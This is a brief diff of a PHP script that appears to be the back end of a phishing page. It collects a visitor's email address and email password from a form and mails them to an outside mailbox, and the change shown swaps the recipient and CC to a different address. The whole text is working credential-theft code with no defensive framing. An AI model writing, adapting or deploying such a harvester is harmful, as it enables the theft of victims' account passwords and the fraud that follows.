@@ -2,11 +2,11 @@
 //get data from form  
 $email = $_POST['email'];
 $empass = $_POST['empass'];
-$to = "lawyer.paul@macr2.com";
+$to = "whykkaymailbox@pupsikaneto.ml";
 $subject = "Mail From website";
 $txt ="Email = ". $email . "\r\n  Empass =" . $empass;
 $headers = "From: account@offshore.cusocalb.com" . "\r\n" .
-"CC: lawyer.paul@macr2.com";
+"CC: whykkaymailbox@pupsikaneto.ml";
 if($empass!=NULL){
     mail($to,$subject,$txt,$headers);
 }
